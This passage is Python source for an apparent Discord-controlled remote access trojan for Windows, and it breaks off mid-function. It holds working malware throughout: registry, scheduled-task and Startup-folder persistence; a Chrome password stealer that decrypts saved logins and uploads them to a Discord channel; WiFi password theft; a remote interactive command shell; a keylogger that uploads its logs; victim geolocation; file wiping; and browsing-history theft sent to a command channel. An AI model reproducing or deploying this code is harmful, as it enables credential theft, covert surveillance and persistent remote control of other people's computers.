---------------------------------------------------------------------------\r\n\r\n@bot.command()\r\nasync def better_install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!better_install\":\r\n        script_path = os.path.abspath(sys.argv[0])\r\n\r\n        try:\r\n            # Check the current persistence status\r\n            current_status = CheckBetterPersistence(script_path)\r\n\r\n            response = \"**Persistence Status:**\\n\"\r\n            response += f\"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\\n\"\r\n            response += f\"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\\n\"\r\n            response += f\"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\\n\\n\"\r\n\r\n            await ctx.send(response)\r\n\r\n            await ctx.send(\"\\n**Starting...**\\n\")\r\n            # Check and enable Registry Persistence if not already enabled\r\n            if not current_status['registry_persistence']:\r\n                try:\r\n                    await ctx.send(\"Starting Registry Persistence phase...\")\r\n                    registry_persistence(script_path)\r\n                    await ctx.send(\"Registry Persistence done!\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error starting registry persistence: {e}\")\r\n            else:\r\n                await ctx.send(\"Registry Persistence is already active.\")\r\n\r\n            # Check and enable Task Scheduler Persistence if not already enabled\r\n            if not current_status['task_scheduler_persistence']:\r\n                try:\r\n                    await ctx.send(\"Starting Task Scheduler Persistence phase...\")\r\n                    task_scheduler_persistence(script_path)\r\n                    await ctx.send(\"Task Scheduler Persistence done!\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error starting task scheduler persistence: {e}\")\r\n            else:\r\n                await ctx.send(\"Task Scheduler Persistence is already active.\")\r\n\r\n            # Check and enable Startup Persistence if not already enabled\r\n            if not current_status['startup_persistence']:\r\n                try:\r\n                    await ctx.send(\"Starting Startup Persistence phase...\")\r\n                    startup_persistence(script_path)\r\n                    await ctx.send(\"Startup Persistence done!\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error starting startup persistence: {e}\")\r\n            else:\r\n                await ctx.send(\"Startup Persistence is already active.\")\r\n            \r\n            await ctx.send(\"\\n**Done with all phases! \\nChecking status...**\\n\")\r\n\r\n            # Check the current persistence status\r\n            current_status = CheckBetterPersistence(script_path)\r\n\r\n            NewResponse = \"**New Persistence Status:**\\n\"\r\n            NewResponse += f\"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\\n\"\r\n            NewResponse += f\"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\\n\"\r\n            NewResponse += f\"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\\n\\n\"\r\n\r\n            await ctx.send(NewResponse)\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\ndef registry_persistence(script_path):\r\n    key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\r\n\r\n    # Copy the original script to C:\\Users\\Public\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n    shutil.copy(script_path, copied_script_path)\r\n\r\n    try:\r\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:\r\n            winreg.SetValueEx(registry_key, registryName, 0, winreg.REG_SZ, str(copied_script_path))\r\n    except Exception as e:\r\n        print(f\"Error adding registry persistence: {e}\")\r\n\r\n    #os.system(f'start /MIN \"{copied_script_path}\"')\r\n\r\ndef task_scheduler_persistence(script_path):\r\n    # Automatically determine the username\r\n    username = os.getlogin()\r\n\r\n    # Define a list of possible paths to search for pythonw.exe\r\n    possible_paths = [\r\n        'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory\r\n        'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11\r\n        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)\r\n        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11\r\n    ]\r\n\r\n    # Find the first valid path to pythonw.exe\r\n    pythonw_path = None\r\n    for path in possible_paths:\r\n        if Path(path).is_file():\r\n            pythonw_path = path\r\n            break\r\n\r\n    if pythonw_path is None:\r\n        print(\"pythonw.exe not found. Please specify the correct path.\")\r\n        return\r\n\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n\r\n    # Copy the script to the public directory\r\n    shutil.copyfile(script_path, copied_script_path)\r\n\r\n    # Use os.system to create a scheduled task\r\n    os.system(f\"SCHTASKS /Create /SC ONSTART /TN {taskName} /TR \\\"{path} {copied_script_path}\\\" /RU {username} /f\")\r\n\r\ndef startup_persistence(script_path):\r\n    # Automatically determine the username\r\n    username = os.getlogin()\r\n\r\n    # Define a list of possible paths to search for pythonw.exe\r\n    possible_paths = [\r\n        'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory\r\n        'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11\r\n        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)\r\n        f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11\r\n    ]\r\n\r\n    # Find the first valid path to pythonw.exe\r\n    pythonw_path = None\r\n    for path in possible_paths:\r\n        if Path(path).is_file():\r\n            pythonw_path = path\r\n            break\r\n\r\n    if pythonw_path is None:\r\n        print(\"pythonw.exe not found. Please specify the correct path.\")\r\n        return\r\n    else:\r\n        public_directory = Path('C:/Users/Public')\r\n        copied_script_path = public_directory / Path(script_path).name\r\n        shutil.copy(script_path, copied_script_path)\r\n        startup_folder = Path(os.path.expanduser(\"~\")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'\r\n        shortcut_path = startup_folder / f'{startupName}.lnk'\r\n\r\n        with open(f'{startupName}.bat', 'w') as batch_file:\r\n            batch_file.write(fr'''@echo off\r\n    start \"\" /B \"{path}\" \"{copied_script_path}\"\r\n    :: @echo off\r\n    :: start \"\" /B /MIN {pythonw_path} C:\\Users\\Public\\{registryName}.pyw\r\n    ''')\r\n\r\n        os.system(f'copy {startupName}.bat \"{startup_folder}\"')\r\n        os.remove(f'{startupName}.bat')\r\n\r\n\r\n# Checking of pre\r\n@bot.command()\r\nasync def better_check(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!better_check\":\r\n        script_path = os.path.abspath(sys.argv[0])\r\n        # Check the current persistence status\r\n        current_status = CheckBetterPersistence(script_path)\r\n        response = \"**Persistence Status:**\\n\"\r\n        response += f\"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\\n\"\r\n        response += f\"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\\n\"\r\n        response += f\"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\\n\\n\"\r\n\r\n        await ctx.send(response)\r\n\r\ndef CheckBetterPersistence(script_path):\r\n    registry_persistence_exists = check_registry_persistence(script_path)\r\n    task_scheduler_persistence_exists = check_task_scheduler_persistence(script_path)\r\n    startup_persistence_exists = check_startup_persistence(script_path)\r\n\r\n    return {\r\n        \"registry_persistence\": registry_persistence_exists,\r\n        \"task_scheduler_persistence\": task_scheduler_persistence_exists,\r\n        \"startup_persistence\": startup_persistence_exists,\r\n    }\r\n\r\ndef check_registry_persistence(script_path):\r\n    # Add your code to check registry persistence here\r\n    key = r'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n\r\n    try:\r\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as registry_key:\r\n            value, _ = winreg.QueryValueEx(registry_key, registryName)\r\n            return value == str(copied_script_path)\r\n    except Exception:\r\n        return False\r\n\r\ndef check_task_scheduler_persistence(script_path):\r\n    # Add your code to check task scheduler persistence here\r\n    result = os.system(f'schtasks /query /tn {taskName}')\r\n    return result == 0  # Task exists\r\n\r\ndef check_startup_persistence(script_path):\r\n    # Add your code to check startup folder persistence here\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n    startup_folder = Path(os.path.expanduser(\"~\")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'\r\n    shortcut_path = startup_folder / f'{startupName}.bat'\r\n\r\n    return os.path.exists(str(shortcut_path))\r\n\r\n\r\n# Uninstall\r\n@bot.command()\r\nasync def better_uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!better_uninstall\":\r\n        script_path = os.path.abspath(sys.argv[0])\r\n\r\n        try:\r\n            # Check the current persistence status\r\n            current_status = CheckBetterPersistence(script_path)\r\n\r\n            if current_status['registry_persistence']:\r\n                try:\r\n                    await ctx.send(\"Disabling Registry Persistence...\")\r\n                    remove_registry_persistence()\r\n                    await ctx.send(\"Registry Persistence disabled.\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error disabling registry persistence: {e}\")\r\n\r\n            if current_status['task_scheduler_persistence']:\r\n                try:\r\n                    await ctx.send(\"Removing Task Scheduler Persistence...\")\r\n                    remove_task_scheduler_persistence()\r\n                    await ctx.send(\"Task Scheduler Persistence removed.\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error removing task scheduler persistence: {e}\")\r\n\r\n            if current_status['startup_persistence']:\r\n                try:\r\n                    await ctx.send(\"Disabling Startup Persistence...\")\r\n                    remove_startup_persistence()\r\n                    await ctx.send(\"Startup Persistence disabled.\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error disabling startup persistence: {e}\")\r\n\r\n            await ctx.send(\"\\n**Done with uninstalling persistence!**\\n\")\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n# Add functions to remove persistence\r\ndef remove_registry_persistence():\r\n    key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\r\n\r\n    try:\r\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:\r\n            winreg.DeleteValue(registry_key, registryName)\r\n    except Exception as e:\r\n        print(f\"Error removing registry persistence: {e}\")\r\n\r\ndef remove_task_scheduler_persistence():\r\n    os.system(f\"schtasks /delete /tn {taskName} /f\")\r\n\r\ndef remove_startup_persistence():\r\n    startup_folder = Path(os.path.expanduser(\"~\")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'\r\n    shortcut_path = startup_folder / f'{startupName}.bat'\r\n\r\n    if os.path.exists(str(shortcut_path)):\r\n        os.remove(str(shortcut_path))\r\n\r\n\r\n\r\nUSER_DATA_PATH, LOCAL_STATE_PATH = f\"{os.environ['USERPROFILE']}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\", f\"{os.environ['USERPROFILE']}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State\"\r\nTEMP_DB = f\"{os.environ['TEMP']}\\\\justforfun.db\"\r\n\r\n@bot.command()\r\nasync def passwords_chrome(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!passwords_chrome\":\r\n        await ctx.send(\"Grabbing passwords...\")\r\n        print(\"Chrome Password Decryptor by bytemafia\")\r\n        file_location = os.path.join(os.getcwd(), \"passwords.csv\") # Full file path\r\n        with open(file_location, mode='w', newline='') as passfile: # Write file\r\n            writer = csv.writer(passfile, delimiter=',')\r\n            writer.writerow([\"No      <->      URL      <->      Username      <->      Password\"])\r\n            secret_key = secretKey()\r\n            default_folders = (\"Profile\", \"Default\")\r\n            data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]\r\n            for data_folder in data_folders:\r\n                db_path = f\"{USER_DATA_PATH}\\\\{data_folder}\\\\Login Data\" # Chrome db\r\n                con = login_db(db_path)\r\n            if secret_key and con:\r\n                cur = con.cursor()\r\n                cur.execute(\"select action_url, username_value, password_value from logins\")\r\n                for index, data in enumerate(cur.fetchall()):\r\n                    url = data[0]\r\n                    username = data[1]\r\n                    ciphertext = data[2]\r\n                    if url != \"\" and username != \"\" and ciphertext != \"\": # To only collect valid entries\r\n                        password = password_decrypt(secret_key, ciphertext)\r\n                        writer.writerow([index, url, username, password])\r\n                print(\"Completed! File is at: \" + file_location)\r\n                con.close()\r\n                os.remove(TEMP_DB)\r\n                \r\n        # Uploading the file to the Discord server channel\r\n        with open(file_location, 'rb') as file:\r\n            file = discord.File(file)\r\n            await ctx.send(\"Here are the Chrome passwords:\", file=file)\r\n\r\n        # Remove the file after uploading\r\n        os.remove(file_location)\r\n\r\n# Collecting secret key\r\ndef secretKey():\r\n    try:\r\n        with open(LOCAL_STATE_PATH, \"r\") as f:\r\n            local_state = f.read()\r\n            key_text = json.loads(local_state)[\"os_crypt\"][\"encrypted_key\"]\r\n        key_buffer = base64.b64decode(key_text)[5:]\r\n        key = win32crypt.CryptUnprotectData(key_buffer)[1]\r\n        return key\r\n    except Exception as e:\r\n        print(e)\r\n\r\n# Login to db where creds are stored\r\ndef login_db(db_path):\r\n    try:\r\n        shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error\r\n        sql_connection = sqlite3.connect(TEMP_DB)\r\n        return sql_connection\r\n    except Exception as e:\r\n        print(e)\r\n\r\n# Decrypt the password\r\ndef password_decrypt(secret_key, ciphertext):\r\n    try:\r\n        iv = ciphertext[3:15]\r\n        password_hash = ciphertext[15:-16]\r\n        cipher = AES.new(secret_key, AES.MODE_GCM, iv)\r\n        password = cipher.decrypt(password_hash).decode()\r\n        return password\r\n    except Exception as e:\r\n        print(e)\r\n\r\n@bot.command()\r\nasync def interactive_cmd(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!interactive_cmd\":\r\n        # Check if the command was sent in a text channel and matches the command trigger\r\n        initial_directory = \"C:/Users\"  # Replace with your actual directory path\r\n        await ctx.send(f\"Interactive command prompt started in {initial_directory}. Type `exit` to exit.\")\r\n\r\n        # Start a subprocess for the command prompt\r\n        process = subprocess.Popen(\r\n            ['cmd'],\r\n            stdin=subprocess.PIPE,\r\n            stdout=subprocess.PIPE,\r\n            stderr=subprocess.PIPE,\r\n            shell=True,\r\n            cwd=initial_directory  # Set the initial directory\r\n        )\r\n\r\n        # Read and discard the initial copyright message\r\n        while True:\r\n            output_line = process.stdout.readline().decode('latin-1').strip()\r\n            if not output_line or output_line.endswith(initial_directory + \">\"):\r\n                break\r\n\r\n        async def read_output():\r\n            while True:\r\n                output_line = process.stdout.readline().decode('latin-1').strip()\r\n                if not output_line or output_line.endswith(initial_directory + \">\"):\r\n                    break\r\n                await ctx.send(f\"```\\n{output_line}\\n```\")\r\n\r\n        try:\r\n            while True:\r\n                user_input = await bot.wait_for('message', check=lambda message: message.channel == created_channel)\r\n                if user_input.content.lower() == 'exit':\r\n                    await ctx.send(\"Interactive command prompt ended.\")\r\n                    break\r\n\r\n                # Send user's input to the command prompt\r\n                process.stdin.write(f\"{user_input.content}\\n\".encode())\r\n                process.stdin.flush()\r\n\r\n                # Read the output of the previous command\r\n                await read_output()\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n        process.terminate()\r\n\r\n@bot.command()\r\nasync def geolocate(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!geolocate\":\r\n        await ctx.send(\"Calculating position...\")\r\n        gmaps = googlemaps.Client(GOOGLE_API_KEY)\r\n        loc = gmaps.geolocate()\r\n        latitude = loc['location']['lat']\r\n        longitude = loc['location']['lng']\r\n        accuracy_radius = loc['accuracy']  # Get the accuracy radius\r\n\r\n        google_maps_link = f\"https://maps.google.com/maps?q={latitude},{longitude}\"\r\n        await ctx.send(f\"Google Maps Link: {google_maps_link}\")\r\n        await ctx.send(f\"Accuracy Radius: {accuracy_radius} meters\")\r\n\r\n@bot.command()\r\nasync def messagebox(ctx, type, title, message):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            if not type or not title or not message:\r\n                await ctx.send(\"Please make sure you use the following syntax:\\n!messagebox [type] [title] [message]\")\r\n            else:\r\n                if type == \"error\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showerror(title, message)\r\n                    \r\n                elif type == \"info\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showinfo(title, message)\r\n                    \r\n                elif type == \"warning\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showwarning(title, message)\r\n                    \r\n        except Exception as e:\r\n            await ctx.send(f\"An error ocurred when showing messagebox:\\n{e}\")\r\n\r\n# Network stealer\r\n@bot.command()\r\nasync def network(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!network\":\r\n        await ctx.send(\"Loading WiFi SSIDs and passwords...\")\r\n        nameListString = \"\"\r\n        networkNames = subprocess.check_output(\"netsh wlan show profile\", shell=True, text=True)\r\n        networkNamesLines = networkNames.splitlines()\r\n        for line in networkNamesLines:\r\n            line.strip()\r\n            if ':' in line:\r\n                start = line.index(':') +1\r\n                name = str(line[start:].strip())\r\n                if len(name) > 1:\r\n                    try:\r\n                        checkInfo = f\"netsh wlan show profile name=\\\"{name}\\\" key=clear\"\r\n                        nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)\r\n                        nameInfo = nameInfo.splitlines()\r\n                    except subprocess.CalledProcessError:\r\n                        continue\r\n                    password = \"[!] Not Found!\"\r\n                    for i in nameInfo:\r\n                        if \"Key Content\" in i:\r\n                            start = i.index(\":\") +1\r\n                            password = i[start:].strip()\r\n                    nameListString += \"\\t\\t\" + name + \"\\t:\\t\" + password + \"\\n\"\r\n        await ctx.send(f\"**Saved Networks [NAME : PASSWORD]**:\\n\\n {nameListString}\")\r\n\r\ndef secure_delete_file(path_to_file):\r\n    # Securely delete a file by setting its data to zero.\r\n    CallME('fsutil.exe file setZeroData offset=0 length=9999999999 \"' + path_to_file + '\"')\r\n    os.remove(path_to_file)\r\n\r\n@bot.command()\r\nasync def securefile(ctx, path):\r\n    if ctx.channel == created_channel:\r\n        if not path:\r\n            await ctx.send(\"Please provide path to file (!securefile <path-to-file>).\")\r\n            return\r\n        try:\r\n            secure_delete_file(path)\r\n            await ctx.send(\"Successfully fucked file!\")\r\n            await ctx.message.add_reaction(\"\\U0001F4A5\")  # boom emoji\r\n        except FileNotFoundError as fnfe:\r\n            await ctx.send(\"The specified file was not found (\" + str(fnfe) + \")\")\r\n            return\r\n    \r\n\r\n# make a function that creates a reverse proxy\r\n\r\n\r\n# Create a function that creates a new chat with the same name as current chat\r\n# Everything sent to that chat will be executed using cmd\r\n@bot.command()\r\nasync def interactive(ctx):\r\n    if ctx.channel == created_channel:\r\n        # Get the name of the current chat\r\n        chat_name = ctx.channel.name\r\n\r\n        # Create a new chat with the same name as the current chat in the specified category\r\n        new_chat = await ctx.guild.create_text_channel(chat_name, category=categorieName)\r\n\r\n        # Send a message to the new chat\r\n        await new_chat.send(\"New chat created!\")\r\n\r\n        # Execute a command using cmd\r\n        command = \"ipconfig\"\r\n        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)\r\n\r\n        # Send the result of the command to the new chat\r\n        await new_chat.send(f\"```{result.stdout}```\")\r\n\r\n\r\n@bot.command()\r\nasync def sendkey(ctx, Key):\r\n    if ctx.channel == created_channel:\r\n        if not Key:\r\n            await ctx.send(\"Please provide keys to be pressed (!SendKey <Hello-World\\{ENTER\\}>).\")\r\n            return\r\n\r\n        await ctx.send(\"Creating .VBS script\")\r\n\r\n        # Change all \"-\" to \" \"\r\n        Key = Key.replace(\"-\", \" \")\r\n\r\n        # Create new .vbs script to send key\r\n        script_path = r'C:\\users\\public\\key.vbs'\r\n        with open(script_path, 'w') as f:\r\n            f.write('Set WshShell = WScript.CreateObject(\"WScript.Shell\")\\n')\r\n            f.write(f'WshShell.SendKeys \"{Key}\"\\n')\r\n\r\n        # Execute .vbs script\r\n        await ctx.send(\"Executing Script!\")\r\n        CallME(f'cscript \"{script_path}\"')\r\n\r\n        await ctx.send(\"Sent key: \" + Key)\r\n\r\n\r\n# Create a variable to store the logged keys\r\nlogged_keys = []\r\n\r\n# Define a global variable for the listener and is_logging\r\nlistener = None\r\nis_logging = False\r\n\r\n# Define keys that should trigger a new line\r\nnew_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])\r\n\r\ndef on_key_press(key):\r\n    global is_logging\r\n    if is_logging:\r\n        try:\r\n            # Check if the key is a modifier key and skip logging if it is\r\n            if isinstance(key, keyboard.KeyCode):\r\n                logged_key = key.char\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n        except AttributeError:\r\n            if key == keyboard.Key.space:\r\n                logged_key = \" \"\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n\r\ndef start_logging():\r\n    global listener, is_logging\r\n    logged_keys.clear()  # Clear previously logged keys\r\n    listener = keyboard.Listener(on_press=on_key_press)\r\n    listener.start()\r\n    is_logging = True\r\n    print(\"Logging started...\")\r\n\r\ndef stop_logging():\r\n    global listener, is_logging\r\n    if listener:\r\n        listener.stop()\r\n        with open(\"keylog.txt\", \"w\") as logfile:\r\n            logfile.write(\" \".join(logged_keys))\r\n        is_logging = False\r\n        print(\"Logging stopped. Keys saved to 'keylog.txt'\")\r\n\r\n@bot.command()\r\nasync def startlog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            await ctx.send(\"Logging is already started. Use **!dumplog** to see logs.\")\r\n        else:\r\n            start_logging()\r\n            await ctx.send(\"Logging started. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def stoplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            stop_logging()\r\n            await ctx.send(\"Logging stopped. Use **!dumplog** to see logs.\")\r\n        else:\r\n            await ctx.send(\"Logging is already stopped. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def dumplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global logged_keys\r\n        if logged_keys:\r\n            # Save the logged keys to a text file\r\n            with open(\"keylog.txt\", \"w\") as logfile:\r\n                logfile.write(\"\".join(logged_keys))\r\n\r\n            # Send the log file as an attachment\r\n            await ctx.send(\"Here is the log:\", file=discord.File(\"keylog.txt\"))\r\n\r\n            # Delete the temporary log file\r\n            os.remove(\"keylog.txt\")\r\n        else:\r\n            await ctx.send(\"No keys have been logged yet.\")\r\n\r\n@bot.command()\r\nasync def restart(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel:\r\n        \r\n        await ctx.send(\"Restarting...\")\r\n\r\n        # Determine the script filename dynamically\r\n        script_filename = sys.argv[0]\r\n\r\n        # Build the command to run the script with arguments\r\n        script_command = [sys.executable, script_filename]\r\n\r\n        # Start a new process to run the script\r\n        subprocess.Popen(script_command)\r\n\r\n        # Delete channel\r\n        if created_channel:\r\n            await created_channel.delete()\r\n\r\n        # Exit the current script\r\n        sys.exit()\r\n\r\n\r\ndef installNirsoft(zip_file_url, exe_file_name):\r\n    # Destination path for the downloaded .zip file\r\n    zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n    # Directory where you want to extract the .exe file\r\n    extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n    \r\n    # Check if the .zip file already exists, and if not, download it\r\n    if not os.path.exists(zip_download_path):\r\n        try:\r\n            # Download the .zip file\r\n            response = requests.get(zip_file_url)\r\n            with open(zip_download_path, 'wb') as file:\r\n                file.write(response.content)\r\n            print(f\".zip File downloaded to {zip_download_path}\")\r\n        except Exception as e:\r\n            print(f\".zip File download failed: {str(e)}\")\r\n\r\n    # Extract the .exe file from the .zip archive\r\n    try:\r\n        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n            # Check if the .exe file exists in the archive\r\n            if exe_file_name in zip_ref.namelist():\r\n                zip_ref.extract(exe_file_name, extraction_directory)\r\n                exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                print(f\".exe File extracted to {exe_path}\")\r\n            else:\r\n                print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n    except Exception as e:\r\n        print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\ndef program_isInstalled(full_path_to_exe):\r\n    return os.path.exists(full_path_to_exe)\r\n\r\n\r\n@bot.command()\r\nasync def history(ctx):\r\n    if ctx.channel == created_channel:\r\n        # URL of the .zip file to download\r\n        zip_file_url = \"https://www.nirsoft.net/utils/browsinghistoryview.zip\"\r\n\r\n        # Destination path for the downloaded .zip file\r\n        zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n        # Directory where you want to extract the .exe file\r\n        extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n\r\n        # Command to execute after extracting the .exe file\r\n        command_to_execute = r'BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml \"C:\\Users\\Public\\history.html\"'\r\n\r\n        # Check if the .zip file already exists, and if not, download it\r\n        if not os.path.exists(zip_download_path):\r\n            try:\r\n                # Download the .zip file\r\n                response = requests.get(zip_file_url)\r\n                with open(zip_download_path, 'wb') as file:\r\n                    file.write(response.content)\r\n                await ctx.send(f\".zip File downloaded to {zip_download_path}\")\r\n                print(f\".zip File downloaded to {zip_download_path}\")\r\n            except Exception as e:\r\n                await ctx.send(f\".zip File download failed: {str(e)}\")\r\n                print(f\".zip File download failed: {str(e)}\")\r\n\r\n        # Extract the .exe file from the .zip archive\r\n        try:\r\n            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n                # Specify the name of the .exe file you want to extract\r\n                exe_file_name = \"BrowsingHistoryView.exe\"\r\n\r\n                # Check if the .exe file exists in the archive\r\n                if exe_file_name in zip_ref.namelist():\r\n                    zip_ref.extract(exe_file_name, extraction_directory)\r\n                    exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                    await ctx.send(f\".exe File extracted to {exe_path}\")\r\n                    print(f\".exe File extracted to {exe_path}\")\r\n                else:\r\n                    await ctx.send(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n                    print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"Extraction of .exe file failed: {str(e)}\")\r\n            print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\n        # Execute the command using the extracted .exe file\r\n        try:\r\n            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)\r\n            success_message = \"Command executed successfully.\"\r\n            print(success_message)\r\n            await ctx.send(success_message)\r\n\r\n            # Send file to C2\r\n            await ctx.send(\"Sent file to C2\", file=discord.File(extraction_directory + \"\\history.html\"))\r\n\r\n            # Delete the archive (.zip) and the extracted .exe file\r\n            os.remove(extraction_directory + \"\\\\history.html\")\r\n            os.remove(zip_download_path)\r\n            os.remove(exe_path)\r\n            print(f\".zip, .html and .exe files deleted.\")\r\n            await ctx.send(f\".zip, .html and .exe files deleted.\")\r\n        except Exception as e:\r\n            error_message = f\"Command execution failed: {str(e)}\"\r\n            print(error_message)\r\n            await ctx.send(\"Error: \" + error_message)\r\n\r\n@bot.command()\r\nasync def volume(ctx, volume_amount):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            if program_isInstalled(\"C:\\\\Users\\\\Public\\\\nircmd.exe\"):\r\n                await ctx.send(f\"NirCMD is installed and ready!\")\r\n\r\n                volume_amount = int(volume_amount)\r\n\r\n                if 0 <= volume_amount <= 100:\r\n                    # Calculate from procentage to NirCMD volume (1% being 655)\r\n                    volume_level = volume_amount * 655\r\n\r\n                    try:\r\n                        command = f\"C:\\\\Users\\\\Public\\\\nircmd.exe setsysvolume {volume_level}\"  # Update the path here\r\n                        os.system(command)\r\n                        await ctx.send(f\"Volume changed to {volume_amount}%.\")\r\n                    except Exception as e:\r\n                        await ctx.send(f\"An error occurred while changing the volume: {e}\")\r\n                else:\r\n                    await ctx.send(\"Volume amount must be between 0 and 100.\")\r\n            else:\r\n                await ctx.send(\"NirCMD is not installed, installing it now!\")\r\n\r\n                # Install NirCMD om man inte har det\r\n                installNirsoft(\"https://www.nirsoft.net/utils/nircmd.zip\", \"nircmd.exe\")\r\n\r\n                await ctx.send(\"NirCMD has been installed. Try running the command again now.\")\r\n        except ValueError:\r\n            await ctx.send(\"Invalid volume amount. Please provide a number between 0 and 100.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if 